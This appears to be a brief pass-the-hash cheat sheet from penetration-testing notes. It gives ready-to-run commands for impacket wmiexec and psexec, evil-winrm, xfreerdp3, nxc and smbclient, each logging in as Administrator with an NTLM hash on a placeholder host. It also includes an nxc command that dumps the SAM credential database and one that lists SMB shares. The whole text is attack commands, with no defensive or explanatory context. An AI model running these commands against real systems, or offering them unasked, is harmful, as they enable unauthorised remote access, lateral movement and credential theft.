# impacket-wmiexec
Passing the hash using impacket wmiexec
```
impacket-wmiexec -hashes :HASH Administrator@192.168.x.x
```
# impacket-psexec
Passing the hash using impacket psexec
```
impacket-psexec Administrator@192.168.x.x -hashes :HASH
```
# evir-winrm
Passing the hash using evil-winrm
```
evil-winrm -i 192.168.x.x -u "Administrator" -H HASH
```
# xfreerdp3
Passing the hash using xfreerdp
```
xfreerdp3 /u:Administrator /pth:HASH /v:192.168.x.x
```
# nxc
listing shares
```
nxc smb 192.168.x.x -u Administrator -H 00000000000000000000000000000000:HASH --shares
```

dump the sam database
```
nxc smb 192.168.x.x -u Administrator -H 00000000000000000000000000000000:HASH --sam
```
# smbclient
smbclient
```
smbclient \\\\192.168.x.x\\secrets -U Administrator --pw-nt-hash HASH
```